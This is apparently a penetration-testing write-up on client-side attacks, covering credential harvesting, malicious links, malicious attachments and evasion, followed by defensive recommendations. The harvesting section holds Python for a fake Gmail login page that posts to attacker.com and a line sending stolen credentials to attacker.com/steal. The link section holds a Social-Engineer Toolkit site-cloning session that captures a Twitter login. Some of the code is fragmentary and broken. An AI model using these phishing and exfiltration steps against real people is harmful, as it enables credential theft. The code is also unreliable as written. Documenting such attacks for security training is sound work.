# Client-Side Exploitation

## Summary

These attacks can result in data breaches, financial losses, and reputational damage to the organization. If sensitive information is compromised, it can result in regulatory violations and legal action against the organization. In addition, if the organization's customers or clients are affected, it can result in a loss of trust and damage to the brand.

Furthermore, a lack of proper security measures and training can lead to these attacks being successful. If the organization does not have adequate security protocols in place, attackers can use social engineering tactics to gain access to sensitive information or systems. Additionally, if employees are not properly trained in recognizing and responding to suspicious emails or attachments, they may unknowingly allow these attacks to succeed.

It is the responsibility of C-level executives to ensure that their organization has robust security measures in place to protect against these types of attacks. This includes regular security audits, ongoing employee training and awareness, and implementing security technologies such as firewalls, anti-virus software, and intrusion detection systems. C-level executives must also ensure that there are incident response plans in place to respond quickly and effectively in the event of a security breach. Failure to implement these measures can result in severe consequences for the organization, including financial loss and damage to reputation.

## Business Impact

The business impact of website cloning and malicious file attacks can be significant and far-reaching. These attacks can result in direct financial losses, such as theft of funds or intellectual property, as well as indirect losses, such as lost productivity and damage to the company's reputation. The potential business impacts of these attacks include:

1. Financial losses
   - If attackers gain access to sensitive financial information or systems, they may be able to steal funds or intellectual property. The organization may also incur costs associated with restoring systems and data following a breach.
2. Lost productivity
   - Following a security breach, the organization may need to spend significant time and resources restoring systems and data. This can result in lost productivity and revenue for the organization.
3. Damage to reputation
   - If customer or client data is compromised, it can result in a loss of trust and damage to the organization's reputation. This can lead to a loss of business and difficulty attracting new customers.
4. Legal and regulatory penalties
   - If sensitive information is compromised, it can result in regulatory violations and legal action against the organization. This can result in fines, legal fees, and damage to the organization's reputation.
5. Disruption of operations
   - A security breach can disrupt the organization's operations, potentially leading to downtime, lost revenue, and decreased productivity.

### Credential Harvesting

#### Set up the fake login page
    import requests
        fake_page = '''
        <html>
          <head>
            <title>Gmail Login</title>
          </head>
          <body>
            <form method="post" action="http://attacker.com/login">
              <input type="text" name="username" placeholder="Email">
              <input type="password" name="password" placeholder="Password">
              <input type="submit" value="Login">
            </form>
          </body>
        </html>
        '''

#### Start a local web server to host the fake page
    import http.server
    import socketserver
    
    PORT = 8000
    Handler = http.server.SimpleHTTPRequestHandler
    
    httpd = socketserver.TCPServer(("", PORT), Handler)
    
    print("Fake login page is available at http://localhost:{}/".format(PORT))

#### Wait for a victim to visit the fake login page
    httpd.handle_request()

#### Extract the victim's credentials and send them to the attacker's server
    victim_username = input_data['username']
    victim_password = input_data['password']

    response = requests.post('http://attacker.com/steal', data={'username': victim_username, 'password': victim_password})
  
    print("Credentials for {} have been stolen.".format(victim_username))

1. The attacker creates a fake login page or a phishing website that looks identical to a legitimate website where users enter their login credentials.
2. The attacker sends the phishing link to the victim through email or other communication channels, disguising the link as a legitimate one to entice the victim to click on it.
3. The victim clicks on the link and enters their login credentials on the fake login page or phishing website, believing it to be a legitimate website.
4. The phishing website captures the victim's login credentials, which are then sent to the attacker's server.
5. The attacker can use the stolen credentials to access the victim's accounts and perform unauthorized activities, such as stealing sensitive information or transferring funds.
6. In some cases, the attacker can also use the stolen credentials to pivot to other systems on the victim's network, using them as a foothold for further attacks.
7. The attacker can remain undetected for a long time, as they can use the stolen credentials to log in as the victim and perform actions that appear legitimate.

### Malicious Link

**Using Social Engineering Toolkit (SET):**

    # Social-Engineering Attacks
      set> 1
    
    # Website Attack Vectors
      set> 2
    
    # Site Cloner
      set:webattack>2
      # IP address: 192.168.1.22
      set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.1.22]:192.168.1.22
      set:webattack> Enter the url to clone:twitter.com/login
       [] Cloning the website: https://twitter.com/login [] This could take a little bit…

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.

     [] You may need to copy /var/www/ into /var/www/html depending on where your directory structure is.
     Press {return} if you understand what we're saying here.
     [] Web Jacking Attack Vector is Enabled…Victim needs to click the link. [] The Social-Engineer Toolkit Credential Harvester Attack
     [] Credential Harvester is running on port 80 [] Information will be displayed to you as it arrives below:
    # go to web and open: https://google.com@accounts@0xc0.168.1.22
    
    192.168.1.24 - - [11/Feb/2019 01:54:46] "GET / HTTP/1.1" 200 -
     directory traversal attempt detected from: 192.168.1.24
    # opens a fake twitter login
    192.168.1.24 - - [01/Apr/2023 01:54:59] "GET /index.html HTTP/1.1" 404 -
    
    [] WE GOT A HIT! Printing the output: POSSIBLE USERNAME FIELD FOUND: session[username_or_email]=veho43166188 
    POSSIBLE PASSWORD FIELD FOUND: session[password]=testpass123@ 
    
    PARAM: authenticity_token=ccfecb5221b3f2dfca275505ccc3fd824ac1ff2e PARAM: ui_metrics={"rf":{"a1fc4712673653dc721140c307b3d69bdf1debba19c11a88f047db3675dd013a":-234,"c74278047b48f1012b45b502858bd8416981f37a62e06d7b1a3b7fb029960145":99,"ece868d7ddab4e90b3b79cdef3f463c1edb1af8d9043aff0889136eff50b2a7a":-82,"ae942ff2a53c3475e676e8d6655e26999352ea85d97c4841e2f20cd2b810708d":-210},"s":"5sb3j3j2yR5o0-h0Q_ky-89k40N0EuZ7v7g4aEUCr5KyHp3tVmkracFE845oc-23ta2rQScujGno8eT-6iLLoiCiZz4DMKl65Q_cVhMPckCAQ6vdwu-iMWgphwtX5JSVWdLxI9kookHzpv3t22keXhnGrDeT2GLRPqVQBaTY0QO_zEyewzMmwjMIqyYGZWFV666gf94T0-rs4EGp-PhcMw_w23eQ2FEUKEMTaqJOF0u2wjOq4MacNxIoVas_UUPZKoiGqNhN5AWl0YpAXE6G-v6o80sQbZikdSz4062qvAl65WCE6CGDssXmqlDajIy9rpNy4WwNIHO5zxZBOR1wAAAWjbVmnh"}
     PARAM: scribe_log=
     POSSIBLE USERNAME FIELD FOUND: redirect_after_login=
     PARAM: authenticity_token=ccfecb5221b3f2dfca275505ccc3fd824ac1ff2e
     PARAM: remember_me=1
     [] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.

1. The attacker creates a malicious link that points to a website that contains malware or a phishing scam.
2. The attacker sends the link to the victim through email, instant messaging, or another communication channel, disguising the link as a legitimate one to entice the victim to click it.
3. The victim clicks on the link, which takes them to the malicious website. The website may appear to be legitimate, but it is designed to trick the victim into downloading malware or providing sensitive information.
4. If the website contains malware, it may exploit vulnerabilities in the victim's web browser or other software to download and execute the malware on the victim's computer. For example, it could exploit a buffer overflow vulnerability in a browser plug-in to execute arbitrary code.
5. If the website is a phishing scam, it may prompt the victim to enter their login credentials or other sensitive information. The information is then sent to the attacker, who can use it to compromise the victim's accounts or steal their identity.
6. If the website contains malicious ads, the ads may redirect the victim to other websites that contain malware or phishing scams. These websites may also exploit vulnerabilities in the victim's software to execute malware or steal information.
7. If the website uses social engineering tactics, such as fake login pages or urgent warnings, it can trick the victim into taking actions that compromise their security.

### Malicious Attachment
    import smtplib
    import os
    import subprocess
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email.mime.text import MIMEText
    from email.utils import COMMASPACE
    from email import encoders

      # Email information
        smtp_server = "smtp.gmail.com"
        smtp_port = 587
        sender_email = "sender@gmail.com"
        sender_password = "sender_password"
        recipient_email = "recipient@gmail.com"
      
      # PDF information
        pdf_file = "example.pdf"
        
      # Create a multipart message and set headers
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = COMMASPACE.join([recipient_email])
        msg['Subject'] = "PDF Example"
        msg.attach(MIMEText("Please see the attached PDF file."))
      
      # Open and attach the PDF file
        with open(pdf_file, 'rb') as f:
        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(f.read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(pdf_file)}"')
        msg.attach(attachment)
      
      # Send the message via SMTP
        smtp = smtplib.SMTP(smtp_server, smtp_port)
        smtp.ehlo()
        smtp.starttls()
        smtp.login(sender_email, sender_password)
        smtp.sendmail(sender_email, recipient_email, msg.as_string())
        smtp.quit()

      # Open the PDF file on the local machine
        subprocess.run(['open', pdf_file])

1. The attacker creates a malicious attachment containing malware, which could be a binary executable file, a script file, or a macro embedded in a document.
2. The attacker sends the attachment to the victim through email, instant messaging, or another communication channel.
3. The victim receives the attachment and opens or executes it, either intentionally or unintentionally.
4. If the malware exploits a vulnerability in the victim's software, it can execute arbitrary code, gain elevated privileges, and take control of the system. For example, it could exploit a buffer overflow vulnerability in a software library to execute a payload and gain control of the victim's computer.
5. If the malware uses social engineering tactics to trick the victim into running or opening it, it can execute and compromise the system. For example, the attachment may be disguised as a legitimate document, such as an invoice or a report, to make the victim believe it is safe to open.
6. If the attachment contains macro malware, the malware will execute when the victim enables macros in the document. The macro can then download and execute additional malware on the victim's computer, which can steal sensitive data or provide the attacker with remote access to the system.
7. If the attachment contains ransomware, the malware will execute and begin encrypting the victim's files, making them inaccessible. The ransomware may also spread to other devices on the network and cause significant damage to the victim's data and productivity.

### Evasion Techniques

The malware is detected by multiple antivirus engines under different names, which suggests that it is a polymorphic or metamorphic malware. This means that the malware can change its code or behavior to avoid detection by antivirus software, making it more difficult to identify and remove. Some of the detection names suggest that the malware may be a Trojan, which typically refers to a type of malware that disguises itself as a legitimate file or software program but has malicious intent. Trojans often provide a backdoor for remote access, allowing attackers to take control of an infected system and steal sensitive data. Other detection names suggest that the malware may be a downloader or dropper, which are types of malwares that are designed to download or install additional malware onto a victim's system. Downloaders and droppers are often used as a first stage in an attack, allowing attackers to gain a foothold on a system and then escalate their privileges to carry out more sophisticated attacks.

<img width="468" alt="image" src="https://github.com/gabizzle/Penetration-Testing/assets/67624149/757f2175-8edf-4d02-b8bd-7b819775a8a5">


## Recommendation

### Tactical

One of the key tactics used by attackers is credential harvesting, where they attempt to steal or obtain login credentials. To defend against this, organizations can implement strong password policies, use multi-factor authentication, and educate employees about the dangers of sharing login credentials. Additionally, monitoring user accounts for suspicious activity and keeping systems and applications up to date with the latest security patches and updates can help prevent attackers from exploiting known vulnerabilities.

Another common tactic used by attackers is the use of malicious links and attachments, which can be delivered through emails or other sources. To defend against these types of attacks, organizations can use web filtering and email filtering solutions to block access to known malicious domains and URLs, as well as suspicious attachments. Educating employees on how to identify and report suspicious activity, using anti-virus and anti-malware software, and implementing attachment sandboxing or containerization can also help isolate and analyze suspicious attachments.

Evasion techniques, such as fileless malware and code obfuscation, are also commonly used by attackers to bypass security controls. To defend against these techniques, organizations can implement advanced threat detection solutions, machine learning, and AI-based solutions to detect and prevent sophisticated evasion techniques. Regularly testing and evaluating security solutions can also help ensure they can detect and prevent evasion techniques effectively.

### Strategic

To effectively defend against credential harvesting, malicious links, malicious attachments, and evasion techniques, organizations need to adopt strategic recommendations that go beyond tactical measures. One of the key strategic recommendations is to implement a comprehensive security awareness training program for employees. This can help create a culture of security within the organization and improve the overall security posture. Additionally, developing a risk management plan that identifies potential threats and vulnerabilities and outlines strategies for mitigating them is crucial. Implementing a Zero Trust security model, using security analytics and threat intelligence, and developing an incident response plan are also important strategic recommendations. By adopting these recommendations, organizations can improve their overall security posture and reduce their risk of compromise. Ongoing monitoring, testing, and education are essential to ensure that security measures are effective and up to date.
